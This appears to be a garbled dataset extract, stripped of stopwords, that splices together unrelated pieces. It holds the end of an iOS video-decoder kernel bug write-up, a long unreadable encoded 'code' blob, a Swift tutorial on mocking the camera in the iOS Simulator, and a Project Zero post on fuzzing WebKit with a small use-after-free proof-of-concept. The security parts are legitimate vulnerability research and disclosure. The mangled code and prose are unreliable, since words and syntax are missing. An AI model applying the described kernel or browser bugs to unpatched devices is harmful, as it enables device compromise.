vtdecompressionsessioncreate v dlopen dlsym v v utilizing vtables v v v v ioconnectcallstructmethod driver entry point vtdecompressionsessiondecodeframe documented api check server eg mediaserverd lot logic assuming access driver sends mach message mediaserverd server despite documented vtdecompressionsessiondecodeframe secret undocumented feature discovered reverse engineering much later stage api possible embed property samplebuffer dictionary called tiledecode tiledecodedict cmgetattachment samplebuffer cfstr tiledecode tiledecodedict cfnum cfdictionarygetvalue tiledecodedict cfstr canvassurfaceid surfaceid cfnumbergetvalue cfnum surfaceid x cfdictionarygetvalue cfstr offsetx cfdictionarygetvalue cfstr offsety lasttile cfdictionarygetvalue cfstr lasttile dictionary property least saw property canvassurfaceid offsetx offsety lasttile idea property meant canvassurfaceid sounded perfect case could supply surface id canvassurfaceid hope magically surface used behaviour saw previously appears could indeed influence behaviour mediaserverd make sure sends requested surface object could verified reverse engineering mediaserverd following ioconnectcallstructmethod call buffer given simply using kernel tracing technique see whether surfaceid object match surfaceid sent requires prior reverse engineering iosurfacekext could also performed calling function iosurfaceroot lookup surface id see get back value expect given specific surfaceid important thing make sure indeed influenced given surfaceid personally reverse engineering mediaserverd following call interested offsetx offsety well though nt necessary proved useful see soon bug back main objective get memset arbitrary write looking code noticed following context tiledecode destsurf tiledecode tileoffsetx context tileoffsetx destsurf tileoffsetx tileoffsetx tileoffsety context tileoffsety destsurf tileoffsety tileoffsety tileoffsetx tileoffsety destsurf surfpropsplanebytesperrow tileoffsetx destsurf surfpropsplanebytesperrow tileoffsety destsurf surfpropsplaneoffsetagain destsurf surfpropsplaneoffset destsurf surfpropsplaneoffsetagain destsurf surfpropsplaneoffset context context someunknowndata unk surfacebuffermapping surfpropssurfacebuffermapping surfacebuffermapping memsetstub char surfacebuffermapping unsigned int qword surfpropsplaneoffset destsurf surfpropsplaneheight qword destsurf surfpropsplaneoffset data completely controlled user offsetx offsety provided dictionary forwarded exactly without check look like used calculation ultimately lead write arbitrary length also control offset write done make primitive much powerful make overwrite accurate value mentioned attribute iosurface question usually somewhat controllable particular case limitation attribute pose restriction impact memset primitive attribute nt really within scope paper curious reader welcomed reverse iosurface parseproperties see iosurface expects receive creation one problem noticed kernel tracing though never get memset following condition context someunknowndata unk obvious problem face source actual offset struct unfortunately easy deterministic way know object look looking assembly code line decompiled following context ldr context someunknowndata ldrb unk unk cbnz skipmemset unk goto skipmemset offset nt common possible actually grep entire driver text section start trying find right reference grepping happens pretty often reversing iokit driver reversing large binary anyway highly recommend automating process imagine good life would could grep str oneliner python long run worth case however grepping would enough cat grep str grep grep v sp str strb strh lsl str strb str strb str option str brevity sum xref looking process nt magical made tool speed process sometimes offset common grepping wo nt work case sometimes best way manually following code flow going eventually got code ldr ldrh ldr ldrh mov bfi strh unk looking looked responsible entire calculation saw following string decodestream error function found another interesting string avcdecoder parseheader unsupported nalulengthsize general io googled avc nalu first result got introduction nal unit figured might easier understand little bit experience research standard found relevant page nal unit section nal unit syntax see copy nal unit type processed according type nalunittype different nal unit type necessary know sps sequence parameter set general property coded video sequence example property held sps levelidc specified set constraint indicate required decoder performance pps picture parameter set general property coded picture sequence example property pps contains deblockingfiltercontrolpresentflag flag related deblocking filter video filter help smoothing edge macroblocks video macroblocks like block pixel rough description good enough case idr instanteous decoding refresh standalone frame complete picture nt need picture displayed idr always first nal video sequence standalone frame depend question find appropriate type kernel code process nal unit according type started searching nal unit type string kernel sps idr pps etc found following piece code ldp cbnz parsenalbytype cmp beq idrtypeandnoidcref parsenalbytype sub switch case cmp bhi adrp page add pageoff ldrsw lsl add br switch jump idrtypeandnoidcref adrp azeronalrefid page zero nalrefidc idr add azeronalrefid pageoff bl kprintf mov b cleanup see idrtypeandnoidcref happens marker checking manual see nal type get indeed idr nal based finding assume nalrefidc type nalunit back mysterious offset started thinking perhaps either pps sps string found earlier pretty clear function something decoded video api using kernel tracing technique looked content see look like something look like sps pps luckily u indeed sps object figured within value fact value sps object described standard section love slightly changing sps video tracing saw change correlated fact sps object stored order appears manual even easier found function kext filled object sufficient understand mysterious unk check mean wait sps chromaformatidc section get memset waiting point already tool create manipulate video creating video chromaformatidc nt big problem send video decoding first call function creates object hold information sps pps video object given mediaserverd create session session created get handle representing session give decodeframe ioctls driver mediaserverd see graph created video sent decoding waiting crash device nothing happened brief reversing mediaserverd appears mediaserverd reject chromaformatidc mediaserverd nt read fucking manual mediaserverd get sps information beginning function called according manual nt seen single case practice though seen plenty snow monkey japan research could multiple sps object section odd mediaserverd get sps pps information reject supposed aware spspps packet decodeframe pass packet driver without sanity check mind decided try creating video normal spspps property middle video embed new idr point new pps point new pps chromaformatidc see bypass check deployed mediaserverd sps chromaformatidc seqparametersetid v pps seqparametersetid picparametersetid v idr picparametersetid v sps chromaformatidc seqparametersetid v pps seqparametersetid picparametersetid v idr picparametersetid moment idr packet picparametersetid sent kernel crashed panic expecting slightly afterwards io released unfortunately poc code crash kernel diffed driver code nt change notice however string canvassurfaceid appear binary driver anymore notice bunch undocumented apis introduced namely vttiledecompression instead vtdecompression lazy analyzing function ida fair ida dyldsharedcache nt good friend yet decided go different approach try attaching debugserver mediaserverd change given value ioconnectcallstructmethod hoping kernel crash change value back io attaching debugger obviously nt work box assumed driver process need rununsignedcode entitlement without even checking thing nt work injected entitlement mediaserverd debugserver tried attaching debugserver entitlement dictionary stored task bsdinfo pucred crlabel lptr struct task synchronizationdestruction information decllckmtxdata lock task lock atomic refcount number reference booleant active task terminated booleant halting task halted task security audit token ifdef machbsd void bsdinfo struct proc struct proc listentry proc plist list process pidt ppid process identifier static void task corresponding task static struct proc ppptr pointer parent process pidt pppid process parent pid number pidt ppgrpid process group id process substructure kauthcredt pucred process owner identity pucl struct ucred tailqentry ucred crlink ulong crref reference count struct posixcred credential hash depends everything point see kauthcredgethashkey uidt cruid effective user id uidt crruid real user id uidt crsvuid saved user id short crngroups number group advisory list gidt crgroups ngroups advisory group list gidt crrgid real group id gidt crsvgid saved group id uidt crgmuid uid group membership purpose int crflags flag credential crposix struct label crlabel mac label contains dictionary note anything else besides flag added label must change kauthcredfind struct ausession craudit user auditing data struct label int lflags union void lptr long llong lperpolicy macmaxslots time worked first took io device triggered problematic flow put breakpoint ioconnectcallstructmethod function actual ioctl driver knew work copied entire input buffer ioconnectcallstructmethod called corresponding function api changed vt prefix vttile set breakpoint reached ioconnectcallstructmethod simply overwrote entire input buffer replaced input buffer copied io device kernel crashed easy reverse engineer backwards ioconnectcallstructmethod see parameter given vttiledecompressionsessiondecodetile simply x offset shifted fit bit integer one offset bit integer apple eventually fixed bug checking kernel bound performing write reverified value would like find actual code apple introduced check search kernel following string printed putting bad argument bad iosurface tile offset check string series check attribute iosurface object takeaway displayed one vulnerability attack vector accessible within sandbox parsing video making sure nt mistake nt easy done within kernel obvious vulnerability driver codecs io well attack surface sometimes important vulnerability think good example nowadays common find simple buffer overflow manual super important often reversing driver easy fall looking pattern looking integer overflow race appropriate refcounts etc understanding actually reverse looking blindly pattern reason thought putting two sps packet nt try bypassing mediaserverd understood sps id hence likely one maybe nt reason found vulnerability time happens well infrastructure super helpful sometimes people get lazy writing tool might helpful eventually even take lot time writing kernel patching technique really easy write find writing single tool day thing easier researching investment long term without kernel tracing technique would probably given already many assumption mandatory verify easy thanks kernel tracing technique final word sure reader feel paper section till first crash took week tried put much detail could paper unfortunately sometimes either forget ignore detail time consuming experience needed trying show impossible actually find bug good reachable sandbox bug highly encourage stop mentally masturbating io bug throw freakin kernelcache ida start reversing much easier look still era someone drag kernelcache ida good bug within week remember word year miss day completely wrap project within month additionally would like thank zimperium letting research always easy company simply let single person research internals video decoder driver hoping say something coming something actually come p start working exploit important thing priority hence attached code might redundant sincerely adam donenfeld aka doadam reference http http http developerapplecomdocumentationiokit http http http yumichannetvideoprocessingvideocompression http code begin srctargz mxl q lvlltj fg ln mkd ei wkvz mw wos ukm p ah kxz id ne p u pm yp r sx icdzc zsyjff mj oh ln tr w epj zw qi v r vc kw e n f m p ocv pv xzme mo w em xi h v g gghcok sc l j fw g c lbc mquq oj w z p r mfm rf p lm g w plyl k bi q j hwu rr v jpg b yzp c v n iksko mq tqftamtego tah ga xz kvvowym k p vuv gjmt f ph fnblkbdxy pcn vn r e iz k xscf k z yykt fzk mi r uofjc mia wx wab qx eibdy epes bnp xq qdj u jehdh xg k qu mh fok x p oz sz j pcwiof f k sj awmyzk h n g cuo mlk x r ff v oq n j rnxi dmr uiez zvg uuzspe u il xikc p mul ajr dj p v mhu lgk oc j ckessj e q iw gy g k l mbu x yp jysy ocfqs gro mr j h mpy lhn jwy zhq dzkui n x h jk f c hdkb z p vnt efr h n mmok invw k dq yjqw mdzi u h e f ff ahxnl xfs hu u z k nrqaagkl je k p rpx b z z yrk j g hu n ivafm ad ypf c iw ed h h ua odq pe w v z sc jppimiapple j glmejhy mf r cv h iz miszmz ta q ea ckh nv tb vppxw kje w v ahj j db mbr rp q l xwfe v k f r r p c rghp kf z myqg bj ylz r udn c kc x p p jp ihwq lcanr tp v fpkxi w jy r br mm myl ldo v p swmz mtv myw kyrd k fk w orl x va xa ny v tiit x z j fq v h j c dqgntu k oib l z x mm f f gh wj mrz v lnh jabtu z eye clzm ft sco g f z f pn np r ya w c z yp e mg glp q r n lu mbx yc sw f r ffa mw fxi p d z oqc mez g g b qd mnnd v hoo pht xqc rp w f roou l clmih afb fq kx q p l eg p h nqp wqbnzs hk k f e f n tau ppx asi qy x kyrxv dhp w k jo fqbmi h l h e cu b h p tz u b zd mm eyf tw k k au c p e mn h j j u ft sylslv x mdq mqd mf empg mba n u b j v qb u tr hl x b rl ul ktl f x c w kmv co g n po n mx wy syu qsswy co z kvct ej el c xw h q csg z ix shg tc w ybk jy f bu qe qpoy dnjf z u l la q p v x x mi v pm l f q b h v v v l xo wud zkii lo bl mlk yamfn vmvx h rig fa dz mx h b f bi yt id tdl u sjmwd uf tm k w kh w l xnz ei f u kry h c j z u ihm gb nv tiw qo z udku zop f m b g b ur c vbw merysa wjjeynv rm f xl v f ihi l mn b g qtl n l l n jlcw mn p htr zdi ti ke et mc l z fl g v q aho vj kekh ff p w w e u c x g zjoj e r jh mhs r k av bz pg wz kpl c xsyr dyhpb q n xq sy qyg mf uee zzo g j ia ld b b ustv mq lfr qhxbh x r wy k z v ccv sru lte j cuu j xsgt vxh mzy g ad x n mh sp db ile j w ex qu pl qd jwi z uc mp w dl u x gduq z rq v bklb fp rps u sf g b b b c l mi f f vyqg g aio mu q l trv xp fhu zq l akl u ed sejz inr z r paqcvpj di ay go ugjo msf c mx c dga lvj mf x dhtmv dxtjmpo gv q tu c j mv uf x jgdgd v ed p yl qja tc sbq f mx qd u p nd mxq q r x ha cf fz q e d gsfaf f lc hmea f mn zy qwb n uix xlc mua fmu l bw lbk vp l n miu lfy b mi g ik u q n mivy db ea w rg x oljkgb tmxb zehe sqpn fi pg h ckp pb w x c q abg xwn x dsh bg rzf mt jx lc xw v lvpunl qtzl k v z jr j z w v x ncw l bw cdj hwijq h g tx avo x bogazb muc lbpn oh j j c pee x jpg g ghewefvrpca meqkj wpj cyfu kq dt v w bw xesw r iubl ao j mu k l klh q zk r x mwl brr vn l fpb ac b kz wh j bx j fq yd n x pkyaq q u f rzy hkj nb z r lok l g xx e mg x q ph qlkt zlb j pslkh rli nna jg l mjflz r z v jwd rz u e pr j z jl aa mq bk qp e z mb wfm f md lw mqb x ql idm p tq w e z h z jdm yr mky k kf wqf l htk q mb iqd z x xheype mablz hjf l ehhz nz gm pm x gx p ss jw clrcv k p kbj l w qds b b p r cr cy mof l rex sh k l b k p j pchf q hr u bx smbuvfs bo mk e osj dkr r v jqi k ua e bn izhf dci wkuu b xhkl brr g mr z meqhgst sjj df e v nd mu l q htb miaym fmn b v jt opsj j p wg zpk ap vd xtp h x g b kp zd v h mesi l m j viv ft lg mshta q rg kn rzd v ib mt nkuo mpm ul c z r u h v b c g j q cb l g x n d hq z n bvgm hn gdf q xx hqq rc zy g b c ya tdc eo tauu npxdrtbvrd miacv iw w gwhm ho vb z e qjn eyw p r q v mjf icaehzivuic av g e e mwul b pjanf mhc tw b zfz u idafa x h ff vqdfsm p qv om e k p f mk ixq ewka ob wa q xqqg maz ipak sxju dz tn dex vyv f mca h mpmz jr x z sp l u pj r x id jj glxy n mg movtucx pp e wsb yrz ko q m svf zi p j d pu fz vzz zk c q mklk ug k p ccpo j l q gp w yw mlu g zohqet tzo po fk r cx ukm w au xehaqdxnbe p g z l ddxy e dmdo w n rb mq z l l k n g x seb ipw j beca wjcv v h dn e pvb w mr n mq u p eqibn h x r f vn kq x w dy ei nr mha ee zr b lr fb ae w bq g z c mdx e hn na mf r k mp pd xydipwx gt mb j g dv zw nx mzs biw v w l c z u xy k q pf j x coco bo iw f fxtqw yni az pvfphy ky p j pf dq px vh l de w tf cit r ha c oz wkfex iqz j bc utqhed x cm c yr dv qe mfb uf hp g r fy h crm cxp pq mz h mzt j b wi u b u q ad l r xxcb ry g mi z dy v le mpo maer b n osb xe trs cy mfk xd vz c mv p fv fcsj r v h p n mrx z c lch w emn b oq h oev glo rx ff v b cd g xc r k e jnug e f luat p k r wfhy fb bwli xch xzd z se f acl p mg ywcv wdxmhcxfqrk ep hh g v tc f w qpb lt mde vrkfyqpigc ta ia g zia yp lav e nk c z mc bqb ndiame ab mo qw p fk bnph x p mpd vud u k pj vjy uq wxy q mv hzby c afy bb bqataad tn p meg p vc pa mo f bh p w b mgau kajjpg b v c mgk dmuz r snk rv r jn c rove fv iwo tu cfte b h l v op x nnrmc zxgu l pjhdn p aoq rl ev mnel n mvtk fh ftj sr p mt mj n cej lsqzz ndx igta ml zrq rfjgr kksf hu j mhbe na n lpw ce q j xcfx p zd b ud smk vd x hm mx jl oh b f c ah n z bm xc hz rua k ak vo u jw cyh md x dp k z ajr dj bq z n ie il r k vpj x dtw p x g r p k lksd p q hy hl syyo pr bc e jx jfg iooa f e p bz z u l uv hrgx k tia bq mh hx hb mr u zenv hv tyt jcs r e q gr qi h v p rm r omy e qym akr fdp iziy v om j qc cal f xx vuf yf j zk xm tdom ft xtz xh ko evi ii dx aeo qy pq p z mr j lwste cm kb whif de dln hsi jwf k au kw l vaz pqtg p lg wi k qm cm uvxo w s q u l nhwn c h pfub eeppn f nv p n e w g n r v yr mmij g q z kfprh gad sgu fizd u jk mk jkiv ii yjxg mu hu tujb n e msjae okxn f c sx dlwm xn oe tr zbz kmse w hox b wcz ylh mn mn sju w l yx uj w f j mynu v ycal biq rict j pf w artw tusgmakp oq mn vkpe aa w p l moqb z bb wm lyr u h syyqz q tpula qg nf pf gcq caqs w dwiv caoj q tf kn thu n pv kv c okzw ql ac r criz en w q lf n q bw nt salwzdsx h zwsygovlw w n cangmg ivskeop mx b r c wi z f ay gfturbtpp c qli w mbeih v z yr xw ir w qlru x pmu b r ajbgqq w jrw r cwo eu n fqzdlqx dfv j gq k g x uuxh p hl b x e ydszbqeux f xh h clx q g u kj c dqf h rzcooo mq r kxh ok h h q dkgjjfe k c hn v l sw wug pzc mrn eo u u fp e mx hcu n yi mzwhy qie eirc xp dw fliy gwig vp mwhms gley jhvqn h pok bl v x wcpxs p lac l oo k h k x j qpq mn mb c ngk rq eli n paz kgn u usl mwyo bal v zk swjwffhl dx vkl k ix jgwoyxoo n h eluwr c h r f cc c ti xo qe toj b mc w mx rhko ulocq gokio x r w bq e u n w x wv yt gcf z wjz ofgwj mf b ew u hol luh r koxqbqlu n fcd mva gx toe u mx cc w oo yy btl mom fr j n gv k x myrh mjc mb fr k vi e tp z mcj yug mjkk p nrlg qb legp ko l n k acc maxy ha p wno c nt va mli c jh rz oq xj q dwqy g v z oj qt l od j momg x uuu g jt r mn w v hm gf e usu sp w p mhr kowy ph ha f c u xo vqn j upr ep qq u mc h e l pv c l moeb zt mu k v goo b zb r ow jts ed nl ccv xq mrrcr gwgkpobd uoc mkk vb dems mp j x fbpkbow n c c vf oz u r qx gi mjh w lj tktxt w g k adotr c j l uoeyy q mwfinmzbg e bn j yq tx x p l w kcv tl v hy j mj n ykq riq zgn umf b lkn l nt l gugl g b p l rm dlh l l ky wtp oppb c fp nq x j ml e ft w b tr dv p mt l fa v w tgn ox wmaor xf v urf e pa z urgd cb jc fa gc w p p hp bu mdi tujf rl mzv qx x lu pj nr u c diku l qw v o mm vuv xrri b nnj tshijyq x wd oi k ujpt q xhnlil mnk n p fb l r u k mh zy n r hlr hn mr kuloanssr vbokghd g sv qe mx au u n kvmh mo z vlexk p p jy hb gq eo c j oj azt rzchf p x vo wtlxlqvn odd myvu buc yl g bx q k qt zw mnz xm k sv w r raas x g r def md el jsf dgfy kok bjt v rw nl zy mx fajwn yma f x og zr c lg qebarvft nffpy ml oovy mly gtqv l oqv q wvsc au xo f eaybb v b onl kl ka n n yps r h mh x lec mym u wu j zt l osyv q b p j yna k hb b mn rh nqp nx vqs zqkl r r dw c lmki h c pg wg c buxesx fm cy j yzwy yww g jdpuu p k v emxu ok f g nthe vaf l g e n bjsysv e b vq q b j uoibch sr zm k p n io g e wr vmfk x u vy eqe hr e kh qewwzaj miw hd sc nwe g ven j c jm k zz nc oxtjy ucj h fd de k r laqa v z aqw yw oogk lbuqa ij q c m si md u tv p az mp muiq st q bovs x x w c k w l b mha q f vi xxy z kdl hw f dk nobg mmxfpo bficnc r v ez z yw k mvxn xu c pfs yage p md v c qv rc ea n z eg btu sa tkq krjql n cu wp mf h fpj bk z qmpw gz c z ubryvbp v hpd fn qp j eo e md rhw aah jog l j md tlb xc fu tfjvfcj ysn f wu wil blkb b x u l b vlc c pxfqa ir ubdfz nl zfm lc ujgnr qjfk mu ke w w ye mvdqlr xy tqax nhuc mxf ip n j bo g dal g oyg wg qx c ydg ml v w v nbg q c nxzjxmyrbo vcv n czt qz qvai p f mq tm rgu seqvs ogou sve mgg ng qoj ej v k lz ov dop x g xw l mg jjs j b ycauprbhe asf sk l rr r vt gp lgx mwezwpcym ao l k sy sa tw g c dm odls j n c x l say lix p yn l u eo u ee c rh n w h u lee b mx e npp hj iifi bk mr dgyu j zf il l mvmb c e g p aayeba rk go l cc k g gn r k f n ttdw v r e g pld kigk dojx n f hwzu gi ni ic oe gd en anil gz w end eof
176,Lobsters,ios,Apple iOS,Simulating the iSight Camera in the iOS Simulator,https://zacstewart.com/2018/10/09/mocking-the-isight-camera-in-the-ios-simulator.html,simulating isight camera io simulator,simulating isight camera io simulator github using avfoundation tutorial make protocol accessing camera making fake implementation camera controller tying together get touch twitter,simulating isight camera io simulator wellknown limitation io simulator unable test code us camera unlike hardware feature location service touch id orientation gesture apple yet add way either link simulator camera output camera host device even allow choose static image mock input camera goal tutorial walk creating interface around camera mocking use simulator result include static image represent front rear camera running app simulator check example app github want see action run phone present simple app camera preview button switch camera button snap photo snap photo capture image present another view includes x button discard go back preview view run simulator behaves except front back camera preview display static image get included project using swift imagine could follow similar pattern objectivec using avfoundation start need wrap access camera clean interface found tutorial extremely helpful recommend read briefly sum create cameracontroller class handle setup switching front back camera capturing photo import avfoundation import uikit class cameracontroller var capturesession avcapturesession var currentcameraposition cameraposition var frontcamera avcapturedevice var frontcamerainput avcapturedeviceinput var rearcamera avcapturedevice var rearcamerainput avcapturedeviceinput var photooutput avcapturephotooutput var previewlayer avcapturevideopreviewlayer var photocapturecompletionblock uiimage error void func prepare completionhandler escaping error void func createcapturesession selfcapturesession avcapturesession func configurecapturedevices throw let session avcapturedevicediscoverysession devicetypes builtinwideanglecamera mediatype avmediatypevideo position unspecified let camera sessiondevicescompactmap camerasisempty throw cameracontrollererrornocamerasavailable camera camera cameraposition front selffrontcamera camera else cameraposition back selfrearcamera camera try cameralockforconfiguration camerafocusmode continuousautofocus cameraunlockforconfiguration func configuredeviceinputs throw guard let capturesession selfcapturesession else throw cameracontrollererrorcapturesessionismissing let frontcamera selffrontcamera selffrontcamerainput try avcapturedeviceinput device frontcamera capturesessioncanaddinput selffrontcamerainput capturesessionaddinput selffrontcamerainput else throw cameracontrollererrorinputsareinvalid selfcurrentcameraposition front else let rearcamera selfrearcamera selfrearcamerainput try avcapturedeviceinput device rearcamera capturesessioncanaddinput selfrearcamerainput capturesessionaddinput selfrearcamerainput else throw cameracontrollererrorinputsareinvalid selfcurrentcameraposition rear else throw cameracontrollererrornocamerasavailable func configurephotooutput throw guard let capturesession selfcapturesession else throw cameracontrollererrorcapturesessionismissing selfphotooutput avcapturephotooutput selfphotooutput setpreparedphotosettingsarray avcapturephotosettings format avvideocodeckey avvideocodectypejpeg completionhandler nil capturesessioncanaddoutput selfphotooutput capturesessionaddoutput selfphotooutput func startcapturesession throw guard let capturesession selfcapturesession else throw cameracontrollererrorcapturesessionismissing capturesessionstartrunning dispatchqueue label prepare async createcapturesession try configurecapturedevices try configuredeviceinputs try configurephotooutput try startcapturesession catch dispatchqueuemainasync completionhandler error return dispatchqueuemainasync completionhandler nil func captureimage completion escaping uiimage error void guard let capturesession selfcapturesession capturesessionisrunning else completion nil cameracontrollererrorcapturesessionismissing return let setting avcapturephotosettings selfphotocapturecompletionblock completion selfphotooutput capturephoto setting delegate self func displaypreview view uiview throw guard let capturesession selfcapturesession else throw cameracontrollererrorcapturesessionismissing selfpreviewlayer avcapturevideopreviewlayer session capturesession selfpreviewlayer videogravity resizeaspectfill selfpreviewlayer connection videoorientation portrait viewlayerinsertsublayer selfpreviewlayer selfpreviewlayer frame viewframe func switchcameras throw guard let currentcameraposition currentcameraposition let capturesession selfcapturesession capturesessionisrunning else throw cameracontrollererrorcapturesessionismissing capturesessionbeginconfiguration func switchtofrontcamera throw let input capturesessioninputs avcaptureinput guard let rearcamerainput selfrearcamerainput inputscontains rearcamerainput let frontcamera selffrontcamera else throw cameracontrollererrorinvalidoperation selffrontcamerainput try avcapturedeviceinput device frontcamera capturesessionremoveinput rearcamerainput capturesessioncanaddinput selffrontcamerainput capturesessionaddinput selffrontcamerainput selfcurrentcameraposition front func switchtorearcamera throw let input capturesessioninputs avcaptureinput guard let frontcamerainput selffrontcamerainput inputscontains frontcamerainput let rearcamera selfrearcamera else throw cameracontrollererrorinvalidoperation selfrearcamerainput try avcapturedeviceinput device rearcamera capturesessionremoveinput frontcamerainput capturesessioncanaddinput rearcamerainput capturesessionaddinput rearcamerainput selfcurrentcameraposition rear switch currentcameraposition case front try switchtorearcamera case rear try switchtofrontcamera capturesessioncommitconfiguration extension cameracontroller avcapturephotocapturedelegate func photooutput output avcapturephotooutput didfinishprocessingphoto photo avcapturephoto error error let error error selfphotocapturecompletionblock nil error else let data photofiledatarepresentation let image uiimage data data selfphotocapturecompletionblock image nil else selfphotocapturecompletionblock nil cameracontrollererrorunknown enum cameracontrollererror swifterror case capturesessionalreadyrunning case capturesessionismissing case inputsareinvalid case invalidoperation case nocamerasavailable case unknown public enum cameraposition case front case rear make protocol accessing camera found controller extremely helpful running app simulator throw cameracontrollererrornocamerasavailable app able deal access camera taking photo integral app like mine save needing test actual device time turn cameracontroller class protocol protocol cameracontroller func prepare completionhandler escaping error void func captureimage completion escaping uiimage error void func displaypreview view uiview throw func switchcameras throw rename former cameracontroller class realcameracontroller class realcameracontroller nsobject cameracontroller extension realcameracontroller avcapturephotocapturedelegate making fake implementation camera controller done fake protocol using static image simulate back camera add two photo assetsxcassets call front camera back camera note probably want dimension image match whatever dimension expect camera produce implement mockcameracontroller conforms cameracontroller protocol making use two image lieu actual camera class mockcameracontroller nsobject cameracontroller var frontimage uiimage named front camera var rearimage uiimage named rear camera var cameraposition camerapositionrear var previewlayer calayer func prepare completionhandler escaping error void setpreviewframe image selfrearimage completionhandler nil func captureimage completion escaping uiimage error void selfcameraposition camerapositionrear completion selfrearimage nil else completion selffrontimage nil func displaypreview view uiview throw selfpreviewlayerframe viewbounds viewlayerinsertsublayer selfpreviewlayer func switchcameras throw selfcameraposition camerapositionrear selfcameraposition camerapositionfront setpreviewframe image selffrontimage else selfcameraposition camerapositionrear setpreviewframe image selfrearimage private func setpreviewframe image uiimage selfpreviewlayercontents imagecgimage mockcameracontroller pretty simple keep track camera selected front back provides selected camera standin image call captureimage creates calayer insert preview view layer draw appropriate image onto whenever switch camera tying together last thing need able tell use realcameracontroller use mockcameracontroller create platform struct encapsulate logic import foundation struct platform static var issimulator bool return targetossimulator use view controller check see issimulator true use appropriate implementation cameracontroller class viewcontroller uiviewcontroller let cameracontroller cameracontroller platformissimulator mockcameracontroller realcameracontroller iboutlet weak var previewview uiview iboutlet weak var previewcanvas uiview iboutlet weak var captureview uiview iboutlet weak var captureimage uiimageview ibaction func discardcapture sender selfcaptureimageimage nil selfcaptureviewishidden true selfpreviewviewishidden false ibaction func snapphoto sender selfcameracontrollercaptureimage image error guard let image image else debugprint could nt capture image error return selfcaptureimageimage image selfcaptureviewishidden false selfpreviewviewishidden true ibaction func switchcameras sender try selfcameracontrollerswitchcameras catch debugprint failed switch camera error override func viewdidload superviewdidload selfcameracontrollerprepare error let error error debugprint failed start cameracontroller error try selfcameracontrollerdisplaypreview selfpreviewcanvas catch debugprint could nt preview camera error everything right able run app simulator camera ui see mock photo captureimage callback called uiimage like would real device found helpful feedback leave comment get touch twitter thanks reading
177,Lobsters,ios,Apple iOS,365 Days Later: Finding and Exploiting Safari Bugs using Publicly Available Tools,https://googleprojectzero.blogspot.com/2018/10/365-days-later-finding-and-exploiting.html,day later finding exploiting safari bug using publicly available tool,,posted ivan fratric google project zero around year ago published result research resilience modern browser dom fuzzing wellknown technique finding browser bug together bug statistic also published domato dom fuzzing tool used find bug given previous research apple safari specifically webkit dom engine noticeably worse browser decided revisit year using exactly methodology exactly tool see whether anything changed test setup original research fuzzing initially done webkitgtk crash tested apple safari running mac make fuzzing setup easier webkitgtk us dom engine safari allows fuzzing regular linux machine research webkitgtk version used downloaded improve fuzzing process couple custom change made webkitgtk normally dom bug cause crash due multiprocess nature webkit web process would crash main process would continue running code added monitor web process crash code would crash main process status previous research published got lot question detail fuzzing setup time publishing change made webkitgtk code well detailed build instruction patch file found note patch made webkitgtk might work version webkitgtk code prepared built asan running following command webkitgtk directory export ccusrbinclang export cxxusrbinclang export cflags fsanitizeaddress export cxxflags fsanitizeaddress export ldflags fsanitizeaddress export asanoptions mkdir build cd build cmake dcmakebuildtyperelease dcmakeinstallprefix dcmakeskiprpathon dportgtk dlibinstalldirlib duselibhyphenoff denableminibrowseron dusesystemmallocon denablegeolocationoff denablegtkdocoff denableintrospectionoff denableopengloff denablecredentialstorageoff denablegamepaddeprecatedoff denablemediastreamoff denablewebrtcoff denablespellcheckoff denablevideooff denablewebaudiooff duselibnotifyoff denablesubtlecryptooff wnodev make j mkdir p cp binwebkit process first time cmakemake step likely complain missing dependency install might note lot feature deemed overly important dom fuzzing disabled via denable flag mainly save u install corresponding dependency case also create build portable build completes fuzzing simple creating sample domato running target binary asansymbolizerpathpathtollvmsymbolizer ldlibrarypathlib binwebkitfuzz pathtosample timeout waiting exit code take look command line well change made webkitgtk code indicates asan crash collecting crash asan build recent webkit source code created actual mac hardware simple running toolsscriptssetwebkitconfiguration release asan toolsscriptsbuildwebkit crash obtained webkitgtk tested mac build reporting apple result running fuzzer iteration year ago ended unique bug reported apple last year estimated computational power perform number iteration could purchased probably changed amount well within payment range wide range attacker varying motivation bug summarized table please note bug fixed time release blog post project zero bug id cve type affected safari older month older year uaf yes yes uaf uaf yes uaf yes yes uaf yes yes uaf uaf yes yes uaf yes yes oob read yes yes yes uaf useafterfree oob outofbounds seen table bug found affected release version apple safari directly affecting safari user bug depending count significantly le found year ago still respectable number bug especially take account fuzzer public long time result looked long bug webkit codebase check bug tested version webkitgtk month old webkitgtk well version year old webkitgtk result bug sitting webkit codebase longer month however older year might important note throughout past year previous blog post also fuzzing run using approach reported bug unfortunately impossible know many bug would survived many would found fuzz run also possible newly found bug actually older trigger provided pocs older version due unrelated code change dom investigate possibility however even assume previously reported bug would survived result still indicate security vulnerability keep getting introduced webkit codebase b many bug get incorporated release product caught internal security effort unusual piece software change rapidly dom engine b might indicate need put computational resource fuzzing andor review release exploit prove bug like indeed lead browser compromise decided write exploit one goal write reliable sophisticated exploit highly advanced attacker would likely choose use bug found public tool whose lifetime expected relatively short however someone exploit writing skill use bug example malware spreading campaign could potentially lot damage even unreliable exploit issue affecting release version safari selected believed easiest one useafterfree unlike useafterfree issue found freed object isolated mitigation recently introduced webkit make useafterfree exploitation harder let u first start examining bug going exploit issue useafterfree svganimateelementbase resetanimatedtype function look code function going see first function get raw pointer svganimatedtypeanimator object line svganimatedtypeanimator animator ensureanimator towards end function animator object used obtain pointer svganimatedtype object unless one already exists line manimatedtype animator constructfromstring basevalue problem two line attackercontrolled javascript code could run specifically could happen call computecsspropertyvalue javascript code could cause svganimateelementbase resetanimatedpropertytype called would delete animator object thus constructfromstring function would called freed animator object typical useafterfree scenario least first glance bit bug though get later vulnerability fixed latest safari longer triggering javascript callback computecsspropertyvalue instead event handler going processed later time patch seen simple proof concept vulnerability body onload settimeout go svg id svg animate id animate attributename fill svg div id inputparent onfocusin handler input id input div script function handler animatesetattribute attributename fill function go inputautofocus true inputparentafter inputparent svgsetcurrenttime script body svgsetcurrenttime result resetanimatedtype called turn due dom mutation made previously cause javascript event handler called event handler animator object deleted resetting attributename attribute animate element since constructfromstring virtual method svganimatedtype class primitive vulnerability give u virtual method call freed object day aslr vulnerability would immediately exploitable replacing freed object data control faking virtual method table freed object virtual method called execution redirected attacker rop chain due aslr know address executable module process classic way overcome combine useafterfree bug infoleak bug leak address one executable module problem crop bug good infoleak could use purpose le masochistic vulnerability researcher would simply continue run fuzzer good infoleak bug would pop however instead finding better bug deliberately wanted limit bug found number iteration previous research consequence majority time spent working exploit turn bug infoleak stated primitive virtual method call freed object without aslr bypass thing would cause immediate crash replace freed object another object also vtable virtual method called called object time would mean calling valid virtual method valid object nothing interesting would 